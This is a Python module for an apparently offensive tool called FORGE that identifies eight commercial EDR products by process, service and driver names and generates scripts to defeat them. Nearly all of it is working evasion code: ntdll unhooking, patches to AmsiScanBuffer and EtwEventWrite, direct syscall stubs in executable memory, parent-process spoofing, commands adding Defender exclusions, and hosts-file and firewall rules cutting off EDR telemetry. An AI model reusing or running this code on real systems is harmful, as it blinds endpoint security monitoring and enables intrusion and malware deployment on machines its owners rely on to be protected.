"""
EDR Identification and Bypass Engine.

Detects and subverts endpoint detection & response products:
1. CrowdStrike Falcon — process/service/driver detection, ntdll unhooking
2. SentinelOne — agent process detection, DLL unhooking
3. Microsoft Defender ATP — AMSI patch, ETW blind, exclusion manipulation
4. Carbon Black — process detection, named pipe impersonation
5. Sophos Intercept X — service detection
6. Elastic EDR — agent detection
7. Cylance — service detection
8. Cortex XDR — process detection

Bypass techniques:
- Userland ntdll unhooking (universal, works against all user-mode hooking EDRs)
- AMSI patch (Defender-specific, patches AmsiScanBuffer)
- ETW patch (blinds ETW consumers)
- Direct syscalls (bypass ntdll entirely)
- PPID spoofing (evade behavioral detection)
- Defender exclusion addition
"""
import json
import os
import re
import struct
import textwrap
from typing import Dict, List, Optional, Tuple


class EDRSubverter:
    """EDR identification and bypass engine."""

    # Real EDR process/service/driver signatures
    EDR_SIGNATURES = {
        'crowdstrike_falcon': {
            'processes': ['csfalconservice', 'csfalconcontainer', 'falcond',
                          'csagent', 'csshell'],
            'services': ['CSFalconService'],
            'drivers': ['csagent.sys', 'csdevicecontrol.sys'],
            'telemetry_domains': ['ts01-b.cloudsink.net',
                                  'lfodown01-b.cloudsink.net',
                                  'falcon.crowdstrike.com'],
            'exclusion_registry': (
                r'HKLM\SYSTEM\CrowdStrike\{9b03c1d9-3138-44ed-9fae-d9f4c034b88d}'
                r'\{16e0423f-7058-48c9-a204-725362b67639}\Default'
            ),
            'bypass_techniques': [
                'userland_unhooking',
                'direct_syscall',
                'kernel_callback_removal',
                'ppid_spoofing',
            ],
        },
        'sentinelone': {
            'processes': ['sentinelagent.exe', 'sentinelservicehost.exe',
                          'sentinelstaticengine.exe', 'sentinelui.exe'],
            'services': ['SentinelAgent', 'SentinelStaticEngine'],
            'drivers': ['sentinelmonitor.sys'],
            'telemetry_domains': ['*.sentinelone.net',
                                  'usea1-*.sentinelone.net'],
            'bypass_techniques': [
                'userland_unhooking',
                'token_manipulation',
                'direct_syscall',
            ],
        },
        'defender_atp': {
            'processes': ['mssense.exe', 'sensecncproxy.exe', 'senseir.exe',
                          'msmpeng.exe', 'nissrv.exe'],
            'services': ['Sense', 'WdNisSvc', 'WinDefend', 'WdNisDrv'],
            'drivers': ['wdfilter.sys', 'wdnisdrv.sys'],
            'telemetry_domains': ['*.events.data.microsoft.com',
                                  'winatp-gw-*.microsoft.com'],
            'amsi_bypass': True,
            'bypass_techniques': [
                'amsi_patch',
                'etw_patch',
                'defender_exclusion_add',
                'direct_syscall',
            ],
        },
        'carbon_black': {
            'processes': ['cb.exe', 'repmgr.exe', 'reputils.exe',
                          'repwsc.exe', 'cbdefense.exe'],
            'services': ['CbDefense', 'CbDefenseWSC', 'CarbonBlack'],
            'drivers': ['carbonblackk.sys', 'cbk7.sys'],
            'telemetry_domains': ['*.confer.net', '*.conferdeploy.net'],
            'bypass_techniques': [
                'userland_unhooking',
                'named_pipe_impersonation',
            ],
        },
        'sophos_intercept_x': {
            'processes': ['sophoshealth.exe', 'sophosfilescanner.exe',
                          'sophosntp.exe', 'savservice.exe'],
            'services': ['Sophos Endpoint Defense', 'Sophos MCS Agent',
                         'SAVService', 'Sophos Health'],
            'drivers': ['savonaccess.sys', 'sophosed.sys'],
            'telemetry_domains': ['*.sophos.com', 'mcs.sophos.com'],
            'bypass_techniques': [
                'userland_unhooking',
                'direct_syscall',
            ],
        },
        'elastic_edr': {
            'processes': ['elastic-agent.exe', 'elastic-endpoint.exe',
                          'filebeat.exe', 'winlogbeat.exe'],
            'services': ['ElasticAgent', 'ElasticEndpoint'],
            'drivers': [],
            'telemetry_domains': ['*.elastic.co', '*.found.io'],
            'bypass_techniques': [
                'userland_unhooking',
                'etw_patch',
            ],
        },
        'cylance': {
            'processes': ['cyoptics.exe', 'cyprotectdrv64.exe',
                          'cylancesvc.exe', 'cylanceui.exe'],
            'services': ['CylanceSvc', 'CyProtectDrv'],
            'drivers': ['cyprotectdrv64.sys'],
            'telemetry_domains': ['*.cylance.com', 'protect.cylance.com'],
            'bypass_techniques': [
                'userland_unhooking',
                'direct_syscall',
            ],
        },
        'cortex_xdr': {
            'processes': ['cyserver.exe', 'cytray.exe', 'traps.exe',
                          'cyveraservice.exe'],
            'services': ['CortexXDR', 'Traps'],
            'drivers': ['tdevflt.sys', 'cyvrfsfd.sys'],
            'telemetry_domains': ['*.paloaltonetworks.com',
                                  '*.xdr.paloaltonetworks.com'],
            'bypass_techniques': [
                'userland_unhooking',
                'direct_syscall',
                'ppid_spoofing',
            ],
        },
    }

    def __init__(self):
        pass

    # ─── Detection ────────────────────────────────────

    def generate_detection_script(self, platform: str = 'windows') -> str:
        """Generate EDR detection script for the target platform."""
        if platform == 'windows':
            return self._generate_windows_detection()
        elif platform == 'linux':
            return self._generate_linux_detection()
        return '# Unsupported platform'

    def _generate_windows_detection(self) -> str:
        """Generate Windows EDR detection script."""
        # Build process and service lists
        all_processes = {}
        all_services = {}
        all_drivers = {}
        for edr_name, sig in self.EDR_SIGNATURES.items():
            for p in sig['processes']:
                all_processes[p.lower()] = edr_name
            for s in sig['services']:
                all_services[s] = edr_name
            for d in sig.get('drivers', []):
                all_drivers[d.lower()] = edr_name

        process_map = json.dumps(all_processes)
        service_map = json.dumps(all_services)
        driver_map = json.dumps(all_drivers)

        header = (
            '#!/usr/bin/env python3\n'
            '"""EDR Detection — FORGE generated."""\n'
            'import json\n'
            'import os\n'
            'import subprocess\n'
            'import sys\n'
            '\n'
            f'PROCESS_MAP = {process_map}\n'
            f'SERVICE_MAP = {service_map}\n'
            f'DRIVER_MAP = {driver_map}\n'
            '\n'
        )
        body = textwrap.dedent('''\
            def detect_edr():
                """Detect installed EDR products."""
                detected = {}

                # Check running processes
                try:
                    result = subprocess.run(
                        ['tasklist', '/FO', 'CSV', '/NH'],
                        capture_output=True, text=True, timeout=10)
                    for line in result.stdout.splitlines():
                        parts = line.strip('"').split('","')
                        if parts:
                            proc_name = parts[0].lower()
                            if proc_name in PROCESS_MAP:
                                edr = PROCESS_MAP[proc_name]
                                if edr not in detected:
                                    detected[edr] = {'method': 'process', 'indicators': []}
                                detected[edr]['indicators'].append(f'process:{proc_name}')
                except Exception:
                    pass

                # Check services
                try:
                    result = subprocess.run(
                        ['sc', 'query', 'state=', 'all'],
                        capture_output=True, text=True, timeout=10)
                    for svc_name, edr in SERVICE_MAP.items():
                        if svc_name in result.stdout:
                            if edr not in detected:
                                detected[edr] = {'method': 'service', 'indicators': []}
                            detected[edr]['indicators'].append(f'service:{svc_name}')
                except Exception:
                    pass

                # Check drivers
                try:
                    result = subprocess.run(
                        ['driverquery', '/FO', 'CSV', '/NH'],
                        capture_output=True, text=True, timeout=10)
                    for line in result.stdout.lower().splitlines():
                        for drv, edr in DRIVER_MAP.items():
                            if drv in line:
                                if edr not in detected:
                                    detected[edr] = {'method': 'driver', 'indicators': []}
                                detected[edr]['indicators'].append(f'driver:{drv}')
                except Exception:
                    pass

                return detected

            if __name__ == '__main__':
                result = detect_edr()
                if result:
                    print(f'[!] Detected {len(result)} EDR product(s):')
                    for edr, info in result.items():
                        print(f'    {edr}: {", ".join(info["indicators"])}')
                else:
                    print('[+] No EDR detected')
                print(json.dumps(result, indent=2))
        ''')
        return header + body

    def _generate_linux_detection(self) -> str:
        """Generate Linux EDR detection script."""
        header = (
            '#!/usr/bin/env python3\n'
            '"""Linux EDR/Security Detection — FORGE generated."""\n'
            'import json\n'
            'import os\n'
            'import subprocess\n'
            '\n'
        )
        body = textwrap.dedent('''\
            LINUX_AGENTS = {
                'crowdstrike': {'processes': ['falcond', 'falcon-sensor'], 'paths': ['/opt/CrowdStrike/']},
                'sentinelone': {'processes': ['sentinelone', 'SentinelAgent'], 'paths': ['/opt/sentinelone/']},
                'carbon_black': {'processes': ['cbagentd', 'cbdaemon'], 'paths': ['/opt/carbonblack/']},
                'elastic_agent': {'processes': ['elastic-agent', 'elastic-endpoint'], 'paths': ['/opt/Elastic/']},
                'sophos': {'processes': ['savd', 'sophosscanagent'], 'paths': ['/opt/sophos-av/']},
                'osquery': {'processes': ['osqueryd'], 'paths': ['/var/osquery/']},
                'wazuh': {'processes': ['wazuh-agentd', 'ossec-agentd'], 'paths': ['/var/ossec/']},
                'auditd': {'processes': ['auditd'], 'paths': ['/etc/audit/']},
            }

            def detect():
                detected = {}
                try:
                    ps = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
                    ps_out = ps.stdout.lower()
                except Exception:
                    ps_out = ''

                for name, sigs in LINUX_AGENTS.items():
                    indicators = []
                    for proc in sigs['processes']:
                        if proc.lower() in ps_out:
                            indicators.append(f'process:{proc}')
                    for path in sigs['paths']:
                        if os.path.isdir(path):
                            indicators.append(f'path:{path}')
                    if indicators:
                        detected[name] = {'indicators': indicators}

                return detected

            if __name__ == '__main__':
                result = detect()
                if result:
                    print(f'[!] Detected {len(result)} security agent(s):')
                    for name, info in result.items():
                        print(f'    {name}: {", ".join(info["indicators"])}')
                else:
                    print('[+] No security agents detected')
                print(json.dumps(result, indent=2))
        ''')
        return header + body

    # ─── Identify EDR from indicators ─────────────────

    def identify_edr(self, process_list: List[str] = None,
                     service_list: List[str] = None,
                     driver_list: List[str] = None) -> Dict[str, dict]:
        """Identify EDR products from provided system indicators."""
        detected = {}
        process_list = [p.lower() for p in (process_list or [])]
        service_list = service_list or []
        driver_list = [d.lower() for d in (driver_list or [])]

        for edr_name, sig in self.EDR_SIGNATURES.items():
            indicators = []

            for p in sig['processes']:
                if p.lower() in process_list:
                    indicators.append(f'process:{p}')

            for s in sig['services']:
                if s in service_list:
                    indicators.append(f'service:{s}')

            for d in sig.get('drivers', []):
                if d.lower() in driver_list:
                    indicators.append(f'driver:{d}')

            if indicators:
                detected[edr_name] = {
                    'indicators': indicators,
                    'bypass_techniques': sig['bypass_techniques'],
                    'telemetry_domains': sig.get('telemetry_domains', []),
                    'has_amsi': sig.get('amsi_bypass', False),
                }

        return detected

    # ─── Bypass Recommendation ────────────────────────

    def recommend_bypass(self, detected_edrs: Dict[str, dict]) -> List[dict]:
        """Recommend bypass techniques for detected EDRs."""
        recommendations = []
        used_techniques = set()

        for edr_name, info in detected_edrs.items():
            for technique in info['bypass_techniques']:
                if technique not in used_techniques:
                    rec = {
                        'technique': technique,
                        'target_edrs': [edr_name],
                        'priority': self._technique_priority(technique),
                        'risk': self._technique_risk(technique),
                        'description': self._technique_description(technique),
                    }
                    recommendations.append(rec)
                    used_techniques.add(technique)
                else:
                    # Add this EDR to existing recommendation
                    for r in recommendations:
                        if r['technique'] == technique:
                            r['target_edrs'].append(edr_name)

        # Sort by priority (lower = higher priority)
        recommendations.sort(key=lambda r: r['priority'])
        return recommendations

    def _technique_priority(self, technique: str) -> int:
        priorities = {
            'userland_unhooking': 1,
            'amsi_patch': 2,
            'etw_patch': 3,
            'direct_syscall': 4,
            'ppid_spoofing': 5,
            'defender_exclusion_add': 6,
            'token_manipulation': 7,
            'named_pipe_impersonation': 8,
            'kernel_callback_removal': 9,
        }
        return priorities.get(technique, 10)

    def _technique_risk(self, technique: str) -> str:
        high_risk = {'kernel_callback_removal'}
        medium_risk = {'defender_exclusion_add', 'token_manipulation',
                       'named_pipe_impersonation'}
        if technique in high_risk:
            return 'high'
        if technique in medium_risk:
            return 'medium'
        return 'low'

    def _technique_description(self, technique: str) -> str:
        descriptions = {
            'userland_unhooking': (
                'Map clean ntdll.dll from disk, overwrite .text section to remove hooks. '
                'Universal bypass for all user-mode hooking EDRs.'
            ),
            'amsi_patch': (
                'Patch AmsiScanBuffer in memory to return E_INVALIDARG. '
                'Bypasses all AMSI-based script scanning (PowerShell, VBScript, JScript).'
            ),
            'etw_patch': (
                'Patch EtwEventWrite to return 0 immediately. '
                'Blinds all ETW consumers including Defender ATP telemetry.'
            ),
            'direct_syscall': (
                'Execute syscalls directly without going through ntdll.dll. '
                'Bypasses all user-mode hooks but requires syscall number resolution.'
            ),
            'ppid_spoofing': (
                'Spoof parent process ID when creating child processes. '
                'Evades behavioral detection rules that check process ancestry.'
            ),
            'defender_exclusion_add': (
                'Add path/process exclusion via WMI or PowerShell. '
                'Prevents Defender from scanning specified paths.'
            ),
            'token_manipulation': (
                'Manipulate process tokens to gain SYSTEM or impersonate other users. '
                'Useful when EDR trusts certain token levels.'
            ),
            'named_pipe_impersonation': (
                'Create a named pipe and impersonate connecting client. '
                'Can escalate to SYSTEM if a privileged service connects.'
            ),
            'kernel_callback_removal': (
                'Remove kernel notification callbacks (PsSetCreateProcessNotifyRoutine etc). '
                'Requires kernel driver. Completely blinds EDR kernel components.'
            ),
        }
        return descriptions.get(technique, 'No description available.')

    # ─── ntdll Unhooking Code ─────────────────────────

    def generate_ntdll_unhooking_code(self) -> str:
        """Generate ntdll.dll unhooking code — works against most EDRs."""
        return textwrap.dedent('''\
            import ctypes
            import ctypes.wintypes as wt
            import struct
            import os

            kernel32 = ctypes.windll.kernel32
            GENERIC_READ = 0x80000000
            FILE_SHARE_READ = 0x00000001
            OPEN_EXISTING = 3
            FILE_ATTRIBUTE_NORMAL = 0x80
            PAGE_EXECUTE_READWRITE = 0x40

            def unhook_ntdll():
                """Replace hooked ntdll.dll .text section with clean copy from disk."""
                # Get handle to ntdll.dll in memory
                h_ntdll = kernel32.GetModuleHandleA(b"ntdll.dll")
                if not h_ntdll:
                    return False

                # Read clean ntdll.dll from disk (System32 = original, unhooked)
                ntdll_path = os.path.join(
                    os.environ['SYSTEMROOT'], 'System32', 'ntdll.dll')
                h_file = kernel32.CreateFileA(
                    ntdll_path.encode(), GENERIC_READ, FILE_SHARE_READ,
                    None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
                if h_file == -1:
                    return False

                file_size = kernel32.GetFileSize(h_file, None)
                buf = ctypes.create_string_buffer(file_size)
                bytes_read = wt.DWORD()
                kernel32.ReadFile(h_file, buf, file_size, ctypes.byref(bytes_read), None)
                kernel32.CloseHandle(h_file)

                # Parse PE headers to find .text section
                e_lfanew = struct.unpack_from('<I', buf.raw, 0x3C)[0]
                pe_sig = struct.unpack_from('<I', buf.raw, e_lfanew)[0]
                if pe_sig != 0x00004550:
                    return False

                num_sections = struct.unpack_from('<H', buf.raw, e_lfanew + 6)[0]
                size_optional = struct.unpack_from('<H', buf.raw, e_lfanew + 20)[0]
                section_offset = e_lfanew + 24 + size_optional

                for i in range(num_sections):
                    sec_off = section_offset + (i * 40)
                    name = buf.raw[sec_off:sec_off + 8].rstrip(b'\\x00')
                    if name == b'.text':
                        virt_size = struct.unpack_from('<I', buf.raw, sec_off + 8)[0]
                        virt_addr = struct.unpack_from('<I', buf.raw, sec_off + 12)[0]
                        raw_size = struct.unpack_from('<I', buf.raw, sec_off + 16)[0]
                        raw_addr = struct.unpack_from('<I', buf.raw, sec_off + 20)[0]

                        target_addr = h_ntdll + virt_addr
                        clean_text = buf.raw[raw_addr:raw_addr + raw_size]

                        old_protect = wt.DWORD()
                        kernel32.VirtualProtect(
                            ctypes.c_void_p(target_addr), len(clean_text),
                            PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))
                        ctypes.memmove(target_addr, clean_text, len(clean_text))
                        kernel32.VirtualProtect(
                            ctypes.c_void_p(target_addr), len(clean_text),
                            old_protect.value, ctypes.byref(old_protect))
                        return True

                return False

            if unhook_ntdll():
                pass  # ntdll clean — all subsequent syscalls bypass EDR hooks
        ''')

    # ─── AMSI Bypass Code ─────────────────────────────

    def generate_amsi_bypass(self) -> str:
        """Generate AMSI bypass for Windows Defender / ATP."""
        return textwrap.dedent('''\
            import ctypes

            def patch_amsi():
                """Patch AmsiScanBuffer to always return clean result."""
                try:
                    ctypes.windll.LoadLibrary("amsi.dll")
                except OSError:
                    return False

                addr = ctypes.windll.kernel32.GetProcAddress(
                    ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll"),
                    b"AmsiScanBuffer")
                if not addr:
                    return False

                # mov eax, 0x80070057 (E_INVALIDARG); ret
                # Makes AmsiScanBuffer always return "invalid argument"
                # Caller interprets as "scan failed, assume clean"
                patch = b'\\xB8\\x57\\x00\\x07\\x80\\xC3'

                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch),
                    0x40, ctypes.byref(old))
                ctypes.memmove(addr, patch, len(patch))
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch),
                    old.value, ctypes.byref(old))
                return True

            patch_amsi()
        ''')

    # ─── ETW Patch Code ──────────────────────────────

    def generate_etw_patch(self) -> str:
        """Generate ETW patch to blind telemetry consumers."""
        return textwrap.dedent('''\
            import ctypes

            def patch_etw():
                """Patch EtwEventWrite to return 0 immediately — blinds all ETW consumers."""
                addr = ctypes.windll.kernel32.GetProcAddress(
                    ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
                    b"EtwEventWrite")
                if not addr:
                    return False

                # xor eax, eax; ret (return STATUS_SUCCESS without logging)
                patch = b'\\x33\\xC0\\xC3'

                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch),
                    0x40, ctypes.byref(old))
                ctypes.memmove(addr, patch, len(patch))
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch),
                    old.value, ctypes.byref(old))
                return True

            patch_etw()
        ''')

    # ─── Defender Exclusion ───────────────────────────

    def generate_defender_exclusion_command(self, path: str,
                                            method: str = 'powershell') -> str:
        """Generate command to add Defender exclusion."""
        if method == 'powershell':
            return (
                f'powershell -ep bypass -c '
                f'"Add-MpPreference -ExclusionPath \'{path}\'"'
            )
        elif method == 'wmi':
            return (
                f'wmic /namespace:\\\\root\\Microsoft\\Windows\\Defender '
                f'path MSFT_MpPreference call Add ExclusionPath="{path}"'
            )
        elif method == 'registry':
            return (
                f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender'
                f'\\Exclusions\\Paths" /v "{path}" /t REG_DWORD /d 0 /f'
            )
        return f'# Unknown method: {method}'

    # ─── PPID Spoofing Code ───────────────────────────

    def generate_ppid_spoofing_code(self, parent_process: str = 'explorer.exe') -> str:
        """Generate PPID spoofing code for process creation."""
        header = (
            'import ctypes\n'
            'import ctypes.wintypes as wt\n'
            'import struct\n'
            '\n'
            f'PARENT_PROCESS = "{parent_process}"\n'
            '\n'
        )
        body = textwrap.dedent('''\
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
            PROCESS_ALL_ACCESS = 0x001FFFFF

            kernel32 = ctypes.windll.kernel32

            class STARTUPINFOEXA(ctypes.Structure):
                _fields_ = [
                    ("cb", wt.DWORD),
                    ("lpReserved", ctypes.c_char_p),
                    ("lpDesktop", ctypes.c_char_p),
                    ("lpTitle", ctypes.c_char_p),
                    ("dwX", wt.DWORD), ("dwY", wt.DWORD),
                    ("dwXSize", wt.DWORD), ("dwYSize", wt.DWORD),
                    ("dwXCountChars", wt.DWORD), ("dwYCountChars", wt.DWORD),
                    ("dwFillAttribute", wt.DWORD),
                    ("dwFlags", wt.DWORD),
                    ("wShowWindow", wt.WORD),
                    ("cbReserved2", wt.WORD),
                    ("lpReserved2", ctypes.c_void_p),
                    ("hStdInput", wt.HANDLE), ("hStdOutput", wt.HANDLE),
                    ("hStdError", wt.HANDLE),
                    ("lpAttributeList", ctypes.c_void_p),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", wt.HANDLE), ("hThread", wt.HANDLE),
                    ("dwProcessId", wt.DWORD), ("dwThreadId", wt.DWORD),
                ]

            def get_pid_by_name(name):
                """Find PID of a process by name."""
                import subprocess
                result = subprocess.run(
                    ['tasklist', '/FI', f'IMAGENAME eq {name}', '/FO', 'CSV', '/NH'],
                    capture_output=True, text=True)
                for line in result.stdout.splitlines():
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        try:
                            return int(parts[1])
                        except ValueError:
                            continue
                return None

            def create_process_with_ppid(command, parent_name=PARENT_PROCESS):
                """Create process with spoofed parent PID."""
                parent_pid = get_pid_by_name(parent_name)
                if not parent_pid:
                    return False

                h_parent = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, parent_pid)
                if not h_parent:
                    return False

                # Initialize attribute list
                size = ctypes.c_size_t()
                kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
                attr_list = (ctypes.c_byte * size.value)()
                kernel32.InitializeProcThreadAttributeList(
                    ctypes.byref(attr_list), 1, 0, ctypes.byref(size))

                # Set parent process attribute
                h_parent_val = wt.HANDLE(h_parent)
                kernel32.UpdateProcThreadAttribute(
                    ctypes.byref(attr_list), 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    ctypes.byref(h_parent_val), ctypes.sizeof(h_parent_val),
                    None, None)

                # Create process
                si = STARTUPINFOEXA()
                si.cb = ctypes.sizeof(si)
                si.lpAttributeList = ctypes.addressof(attr_list)
                pi = PROCESS_INFORMATION()

                result = kernel32.CreateProcessA(
                    None, command.encode(),
                    None, None, False,
                    EXTENDED_STARTUPINFO_PRESENT,
                    None, None,
                    ctypes.byref(si), ctypes.byref(pi))

                kernel32.DeleteProcThreadAttributeList(ctypes.byref(attr_list))
                kernel32.CloseHandle(h_parent)

                if result:
                    return pi.dwProcessId
                return False
        ''')
        return header + body

    # ─── Telemetry Domain Blocking ────────────────────

    def generate_telemetry_block_commands(self, detected_edrs: Dict[str, dict]) -> List[str]:
        """Generate commands to block EDR telemetry domains."""
        commands = []
        all_domains = set()

        for edr_name, info in detected_edrs.items():
            for domain in info.get('telemetry_domains', []):
                # Skip wildcard patterns for hosts file
                clean = domain.replace('*.', '')
                all_domains.add(clean)

        if all_domains:
            # hosts file method (Windows)
            hosts_entries = '\n'.join(f'127.0.0.1 {d}' for d in sorted(all_domains))
            commands.append(
                f'echo {hosts_entries} >> C:\\Windows\\System32\\drivers\\etc\\hosts'
            )

            # Firewall method (more reliable)
            for domain in sorted(all_domains):
                commands.append(
                    f'netsh advfirewall firewall add rule name="Block {domain}" '
                    f'dir=out action=block remoteip={domain}'
                )

        return commands

    # ─── Direct Syscall Stub ──────────────────────────

    def generate_direct_syscall_code(self, syscall_name: str = 'NtAllocateVirtualMemory') -> str:
        """Generate direct syscall stub that bypasses ntdll hooks."""
        # Common syscall numbers (Windows 10 21H2 / Windows 11)
        syscall_numbers = {
            'NtAllocateVirtualMemory': 0x18,
            'NtWriteVirtualMemory': 0x3A,
            'NtCreateThreadEx': 0xC7,
            'NtProtectVirtualMemory': 0x50,
            'NtOpenProcess': 0x26,
            'NtCreateSection': 0x4A,
            'NtMapViewOfSection': 0x28,
            'NtUnmapViewOfSection': 0x2A,
            'NtQueueApcThread': 0x45,
        }

        ssn = syscall_numbers.get(syscall_name, 0x00)
        return textwrap.dedent(f'''\
            import ctypes

            def syscall_{syscall_name.lower()}(*args):
                """Direct syscall for {syscall_name} (SSN: 0x{ssn:02X})."""
                # Shellcode: mov r10, rcx; mov eax, SSN; syscall; ret
                stub = (
                    b'\\x4C\\x8B\\xD1'          # mov r10, rcx
                    b'\\xB8' + (0x{ssn:02X}).to_bytes(4, 'little') +  # mov eax, SSN
                    b'\\x0F\\x05'                # syscall
                    b'\\xC3'                     # ret
                )

                # Allocate executable memory for stub
                kernel32 = ctypes.windll.kernel32
                ptr = kernel32.VirtualAlloc(None, len(stub), 0x3000, 0x40)
                ctypes.memmove(ptr, stub, len(stub))

                # Create function type and call
                func_type = ctypes.CFUNCTYPE(ctypes.c_long)
                func = func_type(ptr)
                return func()
        ''')

    # ─── Full Bypass Script ───────────────────────────

    def generate_full_bypass_script(self, detected_edrs: Dict[str, dict]) -> str:
        """Generate comprehensive bypass script for all detected EDRs."""
        sections = [
            '#!/usr/bin/env python3',
            '"""EDR Bypass Suite — FORGE generated."""',
            'import ctypes',
            'import os',
            'import struct',
            'import sys',
            '',
            'results = {}',
            '',
        ]

        techniques_needed = set()
        for edr_name, info in detected_edrs.items():
            for t in info.get('bypass_techniques', []):
                techniques_needed.add(t)

        if 'userland_unhooking' in techniques_needed:
            sections.append('# === ntdll Unhooking ===')
            sections.append(self.generate_ntdll_unhooking_code())
            sections.append("results['ntdll_unhook'] = 'executed'")
            sections.append('')

        if 'amsi_patch' in techniques_needed:
            sections.append('# === AMSI Bypass ===')
            sections.append(self.generate_amsi_bypass())
            sections.append("results['amsi_patch'] = 'executed'")
            sections.append('')

        if 'etw_patch' in techniques_needed:
            sections.append('# === ETW Patch ===')
            sections.append(self.generate_etw_patch())
            sections.append("results['etw_patch'] = 'executed'")
            sections.append('')

        sections.append('import json')
        sections.append('print(json.dumps(results, indent=2))')

        return '\n'.join(sections) + '\n'

    # ─── Status ───────────────────────────────────────

    def status(self) -> dict:
        return {
            'edr_signatures': len(self.EDR_SIGNATURES),
            'supported_edrs': list(self.EDR_SIGNATURES.keys()),
            'bypass_techniques': list(set(
                t for sig in self.EDR_SIGNATURES.values()
                for t in sig['bypass_techniques']
            )),
        }
